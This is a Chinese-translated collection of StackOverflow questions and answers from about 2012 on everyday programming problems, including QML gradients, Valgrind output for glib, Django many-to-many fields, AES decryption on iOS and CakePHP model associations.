# StackOverflow 问答 10078000-10078999

# qt - 带方向的 QML 梯度

> ID：10078000
> 
> 赞同：9
> 
> 时间：2012-04-09T18:39:01.483
> 
> 标签：qt, gradient, qml, qt-quick

QML 渐变只允许在一个 Rectangle 中从上到下。[文档](http://doc.qt.io/archives/qt-4.7/qml-gradient.html)说它必须通过旋转和裁剪的组合来完成。

我刚刚开始学习 QML（对 HTML/CSS 的经验很少）。这是我的代码，我认为可以改进很多：

```
import QtQuick 1.0

Rectangle {
    width: 400; height: 400;

    Rectangle {
    width: 567; height: 567;

    gradient: Gradient {
            GradientStop {
        position: 0.0;
        color: "white";
        }
            GradientStop {
        position: 1.0;
        color: "blue";
        }
    }
    x: 116.5;
    transformOrigin: Item.Top;
    rotation: 45.0;
    }
} 
```

您能否建议执行此操作的更好方法？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-12-05T22:04:56.553

我已经用以下代码解决了这个问题：[https ://code.google.com/p/ytd-meego/source/browse/trunk/playground/FeedBook/qmltube/Horizo​​ntalGradient.qml?r=144](https://code.google.com/p/ytd-meego/source/browse/trunk/playground/FeedBook/qmltube/HorizontalGradient.qml?r=144)

这是我使用 NielsMayer 的示例所做的：

```
 Rectangle {
        width: parent.height
        height: parent.width
        anchors.centerIn: parent
        rotation: 90

        gradient: Gradient {
            GradientStop { position: 0.0; color: "black" }
            GradientStop { position: 1.0; color: "white" }
        }
    } 
```

这运作良好。玩得开心 ！

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-03-28T17:39:42.097

Qt 5.1 中引入的 Qt Graphical Effects 模块提供了三种渐变类型。使用`LinearGradient`项目（效果）不再需要应用旋转来实现例如水平颜色渐变。
特别是通过点`start`和`end`点（属性）的`LinearGradient` **任何**梯度方向都是可能的。

下面的代码实现了一个 45° 角（如原帖中所建议的那样），从右上角开始以白色开始，以黑色结束左下角：

```
import QtQuick 2.0
import QtGraphicalEffects 1.0

Item {
    id:myItem
    width: 300
    height: 300

    LinearGradient {
        anchors.fill: parent
        start: Qt.point(myItem.width, 0)
        end: Qt.point(0, myItem.height)
        gradient: Gradient {
            GradientStop { position: 0.0; color: "white" }
            GradientStop { position: 1.0; color: "black" }
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-10T23:06:16.050

恐怕文件是正确的。我能想到的唯一另一种方法是用 C++ 编写一个自定义 QML 组件，它可以满足您的需求。

如果你有 Qt/C++ 知识，你可以从这里开始：

*   [http://doc.qt.nokia.com/4.7-snapshot/qml-extending.html](http://doc.qt.nokia.com/4.7-snapshot/qml-extending.html)
*   [http://doc.qt.nokia.com/4.7-snapshot/declarative-tutorials-extending-chapter1-basics.html](http://doc.qt.nokia.com/4.7-snapshot/declarative-tutorials-extending-chapter1-basics.html)

Rectangle 可能是一个很好的模板或基类：

*   [http://qt.gitorious.org/qt/qt/blobs/4.8/src/declarative/graphicsitems/qdeclarativerectangle_p.h](http://qt.gitorious.org/qt/qt/blobs/4.8/src/declarative/graphicsitems/qdeclarativerectangle_p.h)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-12-22T09:38:41.317

您可以使用Qt **5.12中的**[方向属性](https://doc.qt.io/qt-5/qml-qtquick-gradient.html#orientation-prop)

# c - glib：在 g_strsplit 之后，valgrind 报告“仍然可以访问”块

> ID：10078002
> 
> 赞同：1
> 
> 时间：2012-04-09T18:39:04.623
> 
> 标签：c, valgrind, glib

我有一段非常简单的代码：

```
#include <stdio.h>
#include <glib.h>

int main(int argc, char * argv[])
{
  const char * path = "/a/b/c/d/e/f/g/h/";
  gchar ** parts = NULL;
  int i;

  parts = g_strsplit( (const gchar *) path, "/", 0 );

  for ( i = 0; parts[i]; i++ ) {
    if (parts[i][0] == '\0') {
      continue;
    }
    printf("part: %s\n", parts[i]);
  }

  g_strfreev( parts );
  return 0;
} 
```

然而，当我通过 Valgrind 运行这段代码时，我得到了一堆“仍然可以访问”的块：

```
==12924== 
==12924== HEAP SUMMARY:
==12924==     in use at exit: 4,252 bytes in 8 blocks
==12924==   total heap usage: 19 allocs, 11 frees, 4,358 bytes allocated
==12924== 
==12924== 240 bytes in 1 blocks are still reachable in loss record 1 of 6
==12924==    at 0x4A04820: memalign (vg_replace_malloc.c:581)
==12924==    by 0x4A048D7: posix_memalign (vg_replace_malloc.c:709)
==12924==    by 0x36A8255F87: ??? (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825680B: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== 252 bytes in 1 blocks are still reachable in loss record 2 of 6
==12924==    at 0x4A04A28: calloc (vg_replace_malloc.c:467)
==12924==    by 0x36A8241707: g_malloc0 (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8255742: ??? (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825669D: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== 504 bytes in 1 blocks are still reachable in loss record 3 of 6
==12924==    at 0x4A04A28: calloc (vg_replace_malloc.c:467)
==12924==    by 0x36A8241707: g_malloc0 (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8255722: ??? (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825669D: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== 504 bytes in 1 blocks are still reachable in loss record 4 of 6
==12924==    at 0x4A04A28: calloc (vg_replace_malloc.c:467)
==12924==    by 0x36A8241707: g_malloc0 (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825578B: ??? (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825669D: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== 720 bytes in 3 blocks are still reachable in loss record 5 of 6
==12924==    at 0x4A04820: memalign (vg_replace_malloc.c:581)
==12924==    by 0x4A048D7: posix_memalign (vg_replace_malloc.c:709)
==12924==    by 0x36A8255F87: ??? (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8256841: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== 2,032 bytes in 1 blocks are still reachable in loss record 6 of 6
==12924==    at 0x4A04A28: calloc (vg_replace_malloc.c:467)
==12924==    by 0x36A8241707: g_malloc0 (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8256642: g_slice_alloc (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A8257DBD: g_slist_prepend (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x36A825AB15: g_strsplit (in /lib64/libglib-2.0.so.0.2200.5)
==12924==    by 0x4005C8: main (strsplit.c:10)
==12924== 
==12924== LEAK SUMMARY:
==12924==    definitely lost: 0 bytes in 0 blocks
==12924==    indirectly lost: 0 bytes in 0 blocks
==12924==      possibly lost: 0 bytes in 0 blocks
==12924==    still reachable: 4,252 bytes in 8 blocks
==12924==         suppressed: 0 bytes in 0 blocks
==12924== 
==12924== For counts of detected and suppressed errors, rerun with: -v
==12924== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 6 from 6) 
```

我的问题是：我没有正确清理或者这些错误可以安全地忽略吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:04:30.977

从[valgrind 文档](http://valgrind.org/docs/manual/mc-manual.html)中，

> 因为存在具有不同严重性的不同类型的泄漏，所以一个有趣的问题是：哪些泄漏应该被视为真正的“错误”，哪些不应该？
> 
> 绝对丢失和可能丢失的块被视为真正的“错误”。即使指定了 --show-reachable=yes 并打印它们，间接丢失且仍可到达的块不计为真正的“错误”；**这是因为这样的块不需要程序员直接修复。**

因此，您可以放心地忽略这些错误，因为这些块无论如何都会在程序退出时重新声明。

另请阅读此 SO 线程，其中详细讨论了 Valgrind 内存错误

[Valgrind 检测到的仍然可达泄漏](https://stackoverflow.com/questions/3840582/still-reachable-leak-detected-by-valgrind)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-15T14:34:46.927

[本文档](https://aleksander.es/data/valgrind-memcheck.pdf)可能有助于了解 Valgrind/memcheck 检测到的泄漏类型。

至于问题本身，首先不要使用 GLib 中的默认切片分配器在基于 GLib 的程序上运行 valgrind，因为这会在 valgrind 日志中为您提供大量“垃圾”输出。只需运行指示 GLib 使用普通 malloc 的程序：

```
$ G_DEBUG=always-malloc valgrind --leak-check=full --show-reachable=yes your-program your-args 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-16T08:49:13.937

```
Program received signal SIGSEGV, Segmentation fault.

 in g_slice_alloc () from /usr/local/lib/libglib-2.0.so.0

(gdb) backtrace
 in g_slice_alloc () from /usr/local/lib/libglib-2.0.so.0
 in g_slist_prepend () from /usr/local/lib/libglib-2.0.so.0
 in g_strsplit () from /usr/local/lib/libglib-2.0.so.0 
```

* * *

猜猜，glib 中的分配有问题。许多其他使用 Glib 的项目也有这样的问题。

# spring - 资源：单个位置到多个映射

> ID：10078003
> 
> 赞同：0
> 
> 时间：2012-04-09T18:39:06.747
> 
> 标签：spring, google-app-engine, jakarta-ee, servlets, spring-mvc

当我在我的应用程序中使用时：

```
<resources location="/resources/favicon.ico" mapping="/favicon.ico" /> 
```

绘制单一资源。

如何映射单个资源以通过多个映射访问而不需要在本地复制文件？

例如像这样：

```
<resources location="/resources/favicon.ico" mapping="/favicon.ico" />
<resources location="/resources/favicon.ico" mapping="/favicon.png" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:07:09.437

您可以包含通配符。`mapping="/favicon.*"`

# javascript - Javascript 对象扩展

> ID：10078012
> 
> 赞同：2
> 
> 时间：2012-04-09T18:39:35.397
> 
> 标签：javascript

我正在使用 Leaflet 在我的网站上制作地图。我想动态构建图层切换器。构造函数接受一个对象，键是要在地图上显示的图层的名称，值是图层对象本身。我正在从 AJAX 返回的数组动态构建切换器。我遇到的问题是我不知道如何让数组对象的值成为我的新对象中的键。我的代码如下所示：

```
$.ajax ({
    url: '...',
    data: { ... },
    dataType: 'json',
    success: function (data) {
        var overlayMaps = {};
        for (var i in data.elems) {
            var layer = new Layer (...);
            overlayMaps = $.extend ({}, overlayMaps, {data.elems[i].name : layer});
            map.addLayer (layer);
        }
        map.addControl (new L.Control.Layers (baseMaps, overlayMaps));
    }
}); 
```

我的问题是如何做第 9 行。`data.elems[i].name`不想工作。我得到这个错误`missing : after property id`，指向`.`后面`data`。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T18:45:17.903

我认为您只是在寻找[括号符号](https://developer.mozilla.org/en/JavaScript/Reference/Operators/Member_Operators#Bracket_notation)。而不是这个：

```
overlayMaps = $.extend ({}, overlayMaps, {data.elems[i].name, layer}); 
```

你要这个：

```
var opts = {};
opts[data.elems[i].name] = layer;
overlayMaps = $.extend ({}, overlayMaps, opts); 
```

# python - 将 ManyToMany 字段从一个模型实例复制到另一个模型实例

> ID：10078015
> 
> 赞同：15
> 
> 时间：2012-04-09T18:39:49.877
> 
> 标签：python, django, django-models, django-1.4

我是 django 的新手，作为一个学习应用程序，我正在构建一个费用记录应用程序。

在我的模型中，我有三个看起来像这样的类（为简洁起见，我稍微简化了它们）：

```
class AbstractExpense(models.Model):
    description = models.CharField(max_length=100)
    amount      = models.IntegerField()
    category    = models.ForeignKey('Category')
    tags        = models.ManyToManyField('Tag')
    insert_date = models.DateTimeField(auto_now=True)

    class Meta(object):
        abstract = True

class Expense(AbstractExpense):
    date        = models.DateField('Date')

class RecurringExpense(AbstractExpense):
    FREQUENCY_CHOICES = (('D', 'daily'),
                         ('W', 'weekly'),
                         ('M', 'monthly'),
                         ('Y', 'yearly'))
    start_date = models.DateField(blank=False)
    end_date = models.DateField(blank=True, null=True)
    last_check = models.DateField(blank=True, null=True)
    frequency = models.CharField(blank=False, max_length=1, choices=FREQUENCY_CHOICES) 
```

`RecurringExpense`只是一个模板：当系统意识到插入经常性费用（例如：租金）的时间时，它应该获取模板中的信息并将它们复制到`Expense`类的新实例中。以下是`RecurringExpense`负责这项工作的方法的相关内容：

```
Expense(description=self.description,
        amount=self.amount,
        category=self.category,
        # tags=self.tags,
        date=expense_date).save() 
```

以上工作完美无缺，但如果我取消注释该`tags=self.tags`行，django 会抱怨并抛出以下错误：

```
Exception Type: TypeError
Exception Value: 'tags' is an invalid keyword argument for this function
Exception Location: <snip>/django/db/models/base.py in __init__, line 367 
```

我知道[我可以创建一个循环](http://tinyurl.com/coeh55d)来解决这个问题，但我想知道是否有更优雅的方式可以让我一次执行相同的操作......

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-09T21:28:02.003

创建模型实例时，您不能直接设置 m2m 字段。请尝试以下操作：

```
expense = Expense(description=self.description,
        amount=self.amount,
        category=self.category,
        date=expense_date)
expense.save()
expense.tags.add(*self.tags.all()) 
```

您可以查看[https://docs.djangoproject.com/en/1.4/topics/db/examples/many_to_many/](https://docs.djangoproject.com/en/1.4/topics/db/examples/many_to_many/)以获取有关如何处理多对多关系的更多示例。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-10T17:30:56.980

我能想到的最简单的方法：

```
e = Expense(description=self.description,
            amount=self.amount,
            category=self.category,
            date=expense_date)
e.save()
e.tags = self.tags.all() 
```

# iphone - 如何解密在 php 中加密的 Objective C/IOS 中的文件？

> ID：10078026
> 
> 赞同：3
> 
> 时间：2012-04-09T18:41:24.843
> 
> 标签：iphone, objective-c, ios, encryption

我为这个错误搜索了太多，但没有发现任何有用的东西。我得到一个使用以下代码在 php 中加密的文件：

```
mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateencryptkey, base64_encode(file), MCRYPT_MODE_CBC, $hardvector); 
```

我无法在 IOS 中解密它。我尝试了许多库，如 NSDATA+CommonCrypto、NSFileManager-AES、NSDATA-aes，但我在解密文件方面没有成功。

以下是使用的 Objective-C 代码：

```
- (NSData *)AESDecryptWithPassphrase:(NSString *)pass
{
    NSMutableData *ret = [NSMutableData dataWithCapacity:[self length]];
    unsigned long rk[RKLENGTH(KEYBITS)];
    unsigned char key[KEYLENGTH(KEYBITS)];
    const char *password = [pass UTF8String];
    for (int i = 0; i < sizeof(key); i++)
        key[i] = password != 0 ? *password++ : 0;

    int nrounds = rijndaelSetupDecrypt(rk, key, KEYBITS);
    unsigned char *srcBytes = (unsigned char *)[self bytes];
    int index = 0;
    while (index < [self length])
    {
        unsigned char plaintext[16];
        unsigned char ciphertext[16];
        int j;
        for (j = 0; j < sizeof(ciphertext); j++)
        {
            if (index >= [self length])
                break;

            ciphertext[j] = srcBytes[index++];
        }
        rijndaelDecrypt(rk, nrounds, ciphertext, plaintext);
        [ret appendBytes:plaintext length:sizeof(plaintext)];

    }
    return ret;
} 
```

此代码适用于文本但无法解密文件。当我保存解密的文件时，它会说文件系统错误。那些解密的文件无法在任何系统上打开，我认为文件格式在此过程中受到干扰。

我也尝试了以下代码但没有成功：

```
- (NSData *) decryptedDataUsingAlgorithm: (CCAlgorithm) algorithm
                                     key: (id) key      // data or string
                    initializationVector: (id) iv       // data or string
                                 options: (CCOptions) options
                                   error: (CCCryptorStatus *) error
{
    CCCryptorRef cryptor = NULL;
    CCCryptorStatus status = kCCSuccess;

    NSParameterAssert([key isKindOfClass: [NSData class]] || [key isKindOfClass: [NSString class]]);
    NSParameterAssert(iv == nil || [iv isKindOfClass: [NSData class]] || [iv isKindOfClass: [NSString class]]);

    NSMutableData * keyData, * ivData;
    if ( [key isKindOfClass: [NSData class]] )
        keyData = (NSMutableData *) [key mutableCopy];
    else
        keyData = [[key dataUsingEncoding: NSUTF8StringEncoding] mutableCopy];

    if ( [iv isKindOfClass: [NSString class]] )
        ivData = [[iv dataUsingEncoding: NSUTF8StringEncoding] mutableCopy];
    else
        ivData = (NSMutableData *) [iv mutableCopy];    // data or nil

    [keyData autorelease];
    [ivData autorelease];

    // ensure correct lengths for key and iv data, based on algorithms
    FixKeyLengths( algorithm, keyData, ivData );

    status = CCCryptorCreate( kCCDecrypt, algorithm, options,
                              [keyData bytes], [keyData length], [ivData bytes],
                              &cryptor );

    if ( status != kCCSuccess )
    {
        if ( error != NULL )
            *error = status;
        return ( nil );
    }

    NSData * result = [self _runCryptor: cryptor result: &status];
    if ( (result == nil) && (error != NULL) )
        *error = status;

    CCCryptorRelease( cryptor );

    return ( result );
} 
```

上面代码的第二个函数：

```
- (NSData *) _runCryptor: (CCCryptorRef) cryptor result: (CCCryptorStatus *) status
{
    size_t bufsize = CCCryptorGetOutputLength( cryptor, (size_t)[self length], true );
    void * buf = malloc( bufsize );
    size_t bufused = 0;
    size_t bytesTotal = 0;
    *status = CCCryptorUpdate( cryptor, [self bytes], (size_t)[self length], 
                              buf, bufsize, &bufused );
    if ( *status != kCCSuccess )
    {
        free( buf );
        return ( nil );
    }

    bytesTotal += bufused;

    // From Brent Royal-Gordon (Twitter: architechies):
    //  Need to update buf ptr past used bytes when calling CCCryptorFinal()
    *status = CCCryptorFinal( cryptor, buf + bufused, bufsize - bufused, &bufused );
    if ( *status != kCCSuccess )
    {
        free( buf );
        return ( nil );
    }

    bytesTotal += bufused;

    return ( [NSData dataWithBytesNoCopy: buf length: bytesTotal] );
} 
```

我已经一个星期没能解决这个问题了...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:28:36.247

需要注意的一件事是 mcrypt_encrypt 的文件参数，似乎该文件在加密之前进行了 base64 编码（并不是说它没有任何意义），这意味着您必须在解密后进行 base64 解码。

其他参数很简单：
MCRYPT_RIJNDAEL_128 是 AES，128 带有 128 位密钥
MCRYPT_MODE_CBC 是 cbc 模式，CommonCrypto 的默认值。
块大小的填充是空字符，而不是标准的，因此非填充长度可能是一个问题。

并不是说您需要另一种 AES 方法，这是我使用的方法：

```
#import <CommonCrypto/CommonCryptor.h>

+ (NSData *)doCipher:(NSData *)dataIn
                  iv:(NSData *)iv
                 key:(NSData *)symmetricKey
             context:(CCOperation)encryptOrDecrypt
{
    CCCryptorStatus ccStatus   = kCCSuccess;
    size_t          cryptBytes = 0;    // Number of bytes moved to buffer.
    NSMutableData  *dataOut    = [NSMutableData dataWithLength:dataIn.length + kCCBlockSizeAES128];

    ccStatus = CCCrypt( encryptOrDecrypt,
                       kCCAlgorithmAES128,
                       kCCOptionPKCS7Padding,
                       symmetricKey.bytes, 
                       kCCKeySizeAES128,
                       iv.bytes,
                       dataIn.bytes,
                       dataIn.length,
                       dataOut.mutableBytes,
                       dataOut.length,
                       &cryptBytes);

    if (ccStatus != kCCSuccess) {
        NSLog(@"CCCrypt status: %d", ccStatus);
    }

    dataOut.length = cryptBytes;

    return dataOut;
}
// Also add Security.framework to your project. 
```

请注意，它需要 NSData 输入，并且填充被指定为标准 PKCS。

请参阅[CommonCryptor.h](http://www.opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h)

# android - 更新android db时如何保留旧的日期和时间？

> ID：10078036
> 
> 赞同：0
> 
> 时间：2012-04-09T18:41:56.300
> 
> 标签：android, datepicker

在我的程序中更新时，如果用户没有使用数据选择器将日期重新输入到 editText 框中（一个用于日期，另一个用于时间），则更新会将当前日期而不是旧日期插入到数据库中。我怎样才能让它保持旧时光？这是我用来输入日期和时间的代码 int 进入数据库

```
 newTime.year = dateAndTime.get(Calendar.YEAR);
    newTime.month = dateAndTime.get(Calendar.MONTH);
    newTime.monthDay = dateAndTime.get(Calendar.DAY_OF_MONTH);
    newTime.hour = dateAndTime.get(Calendar.HOUR_OF_DAY);
    newTime.minute = dateAndTime.get(Calendar.MINUTE);

    enteredTime = (int) ((newTime).toMillis(true) / 1000); 
```

这是设置单击editText时的日期和时间的代码

```
public void date(View v) {
    int inType = date.getInputType(); // backup the input type
    date.setInputType(InputType.TYPE_NULL); // disable soft input
    date.setInputType(inType);
    new DatePickerDialog(report.this, d, dateAndTime.get(Calendar.YEAR),
            dateAndTime.get(Calendar.MONTH),
            dateAndTime.get(Calendar.DAY_OF_MONTH)).show();

}

public void time(View v) {
    int inType = time.getInputType(); // backup the input type
    time.setInputType(InputType.TYPE_NULL); // disable soft input
    time.setInputType(inType);

    new TimePickerDialog(report.this, t,
            dateAndTime.get(Calendar.HOUR_OF_DAY),
            dateAndTime.get(Calendar.MINUTE), true).show();

}

private void updateLabel() {
    date.setText(fmtDate.format(dateAndTime.getTime()));
}

private void updateLabel1() {
    time.setText(fmtTime.format(dateAndTime.getTime()));
}

DatePickerDialog.OnDateSetListener d = new DatePickerDialog.OnDateSetListener() {
    public void onDateSet(DatePicker view, int year, int monthOfYear,
            int dayOfMonth) {
        dateAndTime.set(Calendar.YEAR, year);
        dateAndTime.set(Calendar.MONTH, monthOfYear);
        dateAndTime.set(Calendar.DAY_OF_MONTH, dayOfMonth);

        updateLabel();
    }
};

TimePickerDialog.OnTimeSetListener t = new TimePickerDialog.OnTimeSetListener() {
    public void onTimeSet(TimePicker view, int hourOfDay, int minute) {
        dateAndTime.set(Calendar.HOUR_OF_DAY, hourOfDay);
        dateAndTime.set(Calendar.MINUTE, minute);

        updateLabel1();
    }
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:01:09.947

我不确定我是否完全理解您的问题，但一种可能性是将文本框设置为您想要的标准。如果您有以毫秒为单位的时间 (dateMillis)，您可以创建一个日历：

```
 Date d = new Date(dateMillis);
    Calendar c = Calendar.getInstance();
    c.setTime(d); 
```

或使用 dateformatter 获取您想要的格式：

```
 Date d = new Date(dateMillis);
    SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy");
    String date = formatter.format(d); 
```

# eclipse - Eclipse 无法解析传递依赖项目？

> ID：10078037
> 
> 赞同：1
> 
> 时间：2012-04-09T18:41:59.070
> 
> 标签：eclipse, maven, compilation, compiler-errors

在 Eclipse 的一个 Java 项目中，我正在尝试调试项目 A。

项目`A`依赖于`B.jar`，通常`B.jar`来自我的`.m2/repository`. 但现在我想对`B`'s 的代码做一些临时更改，并反映在 's 中`A`，所以我直接`B`在 eclipse 中的 project 中编辑源代码，并在's 构建路径中设置`B`为依赖项目。`A`此外，两者都`A`称为`B`它们`C.jar`的依赖项。

这构建`A`得很好，但是当它运行时，`A`'s`classpath`包含所有类和资源的 2 个副本`C.jar`。这给那些休眠`hbm.xml`映射文件带来了问题`C.jar`带来了问题，我得到了错误说`duplicate mapping for...`

这看起来是 eclipse 的一个缺陷，因为它缺乏 maven 拥有的解析能力。有没有办法解决这个问题？（除了构建 B 并安装到 .m2 而不是将其作为依赖项目）

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:56:25.293

您提到“[setting] B 作为 A 的构建路径中的依赖项目”-您的意思是编辑 eclipse 的构建路径还是编辑项目的 POM？我猜是前者，在这种情况下，请确保您安装了最新版本的 m2eclipse 插件，并且两个项目`A`都是`B`Maven eclipse 项目。如果设置正确，那么您的项目应该在其项目图标上看起来有一个“M”，并且任何工作区依赖项的图标应该看起来像文件夹。

# javascript - 将 HTML 源代码注入 iframe 以避免跨站点脚本问题

> ID：10078039
> 
> 赞同：0
> 
> 时间：2012-04-09T18:42:07.280
> 
> 标签：javascript, ajax, security, web

我正在尝试将 iframe 的来源指定为空白 HTML 页面。由于源位于不同的域中，我收到“权限被拒绝”错误。有没有办法让我将 HTML 源代码注入 iframe 以避免跨站点问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T22:57:54.480

将 iframe 连接到另一个域通常不是问题，您可以通过设置 x-frame-options 的 http 标头来防止其他人在 iframe 中查看您的网站。（而且我认为您不必费心检查http响应标头...）。

如果您只需要一个空白页面，则将 iframe 打开到您控制的页面。比如位于您的文档根目录中的blank.html。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:09:23.520

正如 Rook 所说，指向 iframe 跨站点通常没有问题。事实上，iframe 是绕过某种程度的跨站点通信的已知方法之一。此外，这种机制用于广告中，以动态地将内容提供给各种网站上的用户。

无论如何，实现您想要的另一种方法是创建代理服务。在您的本地服务器上，您可以编写一个脚本，对页面发出 GET 请求，然后将 HTML 作为自己的响应返回。这样，您的 iframe 源可以指向您的本地服务器。

# javascript - 通过Javascript触发iOS中的选择“鼓”

> ID：10078042
> 
> 赞同：0
> 
> 时间：2012-04-09T18:42:30.847
> 
> 标签：javascript, ios, dom-events

我有一个网站，其中有选择标签的自定义替换（认为 madlib）。选择标签仍然存在，只是被 Javascript 隐藏。这是一个设计决定，不得出于此问题的目的进行更改。

然而，在 iOS 中，我们应该在做出选择时使用选择“鼓”。但是，当单击该字段时，我似乎无法触发正确的事件以使其出现。

```
...
  $("li.option",$ul).click(function($ev) {
  $ev.stopPropagation() 
  var $el = $(this).parents(".custom_select");
  if( $is_mobile ){
    $("select",$el).trigger("touchstart"); 
  }else{
    [do other webby stuff]
  }
... 
```

1.  “touchstart”是正确的事件吗？“点击”不起作用。
2.  我是否必须让选择可见才能触发事件？

这里还缺少什么吗？我没有错误，只是没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-17T16:50:23.620

iOS5 的最佳解决方案是利用他们识别 type="date" 的能力并让它​​不理会。

对于 Android，仍然不支持。

# php - 使用 find 语句和连接表列出数据

> ID：10078043
> 
> 赞同：0
> 
> 时间：2012-04-09T18:42:36.143
> 
> 标签：php, cakephp

我的 CakePHP 应用程序有以下表格，允许用户之间建立友谊：

```
**Users**
id
username
password

**Profiles**
id
firstname
lastname
user_id

**Friends**
id
user_id_to
user_id_from
status 
```

所以基本上一个用户有一个个人资料，一个用户可以和另一个用户成为朋友，这被记录在称为朋友的数据库表中，简单的状态是确认或不使用 0 或 1（它是一个 int）。所以朋友是两个用户之间的加入。

我正在尝试为用户列出朋友，例如，如果我得到如下网址：

`/people/cameron/friends`它将列出用户 Cameron 的朋友。

但是，我正在努力使用 find 语句来传递用户并找到它们（注意我包含个人资料数据），然后列出与该用户相关的朋友。任何人都可以帮忙吗？

这些是朋友、用户和个人资料模型：

```
class Friend extends AppModel
{
    public $name = 'Friend';

    public $belongsTo = array('User');

    public $actsAs = array('Containable');

} 
```

用户.php

```
 class User extends AppModel
    {
        public $name = 'User';

    public $hasOne = 'Profile';

    public $hasMany = array(
        'Post',
        'Answer',
        'Friend' => array(
            'foreignKey' => 'user_id_to'
        )
    );

public $belongsTo = array(
        'Friend' => array(
            'foreignKey' => 'user_id_from'
        )
    );

    public $actsAs = array('Containable');

        public function getFriends($username)
        {
        return $this->find('all',
        array('conditions' => array('User.username' => $username, 'Friend.status'=>1),
            'contain' => array('Friend' => array('User'))
        ));
        }
    } 
```

配置文件.php

```
class Profile extends AppModel
{
    public $name = 'Profile';

    public $belongsTo = 'User';

    public $actsAs = array('Containable');
} 
```

这是我为用户显示朋友列表的方法：

```
public function index( $username )
{   
    $friends = $this->User->getFriends($username);

    $this->set('friends', $this->paginate());
} 
```

我目前收到此错误：

```
Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'User.user_id_from' in 'on clause'
SQL Query: SELECT `User`.`id`, `User`.`username`, `User`.`password`, `User`.`email`, `User`.`status`, `User`.`code`, `User`.`lastlogin`, `Friend`.`id`, `Friend`.`user_id_from`, `Friend`.`user_id_to`, `Friend`.`datetime`, `Friend`.`status` FROM `db52704_favorr`.`users` AS `User` LEFT JOIN `db52704_favorr`.`friends` AS `Friend` ON (`User`.`user_id_from` = `Friend`.`id`) WHERE `User`.`username` = 'cameron' AND `Friend`.`status` = 1 
```

看起来应用程序认为外键在 User 表中而不是在朋友表中，即使它们在 Friend 关联中调用...任何想法是什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T22:17:59.813

在构造连接查询时，Cake 似乎对那些 foreignKey 分配感到困惑。

您可以尝试用以下内容替换每个关系以强制执行正确的连接语句：

```
public $hasMany = array(
    'Friend' => array(
        'foreignKey' => null,
        'conditions' => array('Friend.user_id_to = User.id')
    )
);

public $belongsTo = array(
    'Friend' => array(
        'foreignKey' => null,
        'conditions' => array('Friend.user_id_from = User.id')
    )
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T22:30:52.130

每当您为 $belongsTo 指定外键时，请记住您指定的名称是*当前*表中的字段名称，而不是其他表中的字段名称。

因此，例如，您对 $belongsTo 的引用`'foreignKey' => 'user_id_to'`应该在**Friends 模型**中，而不是在 Users 模型中。

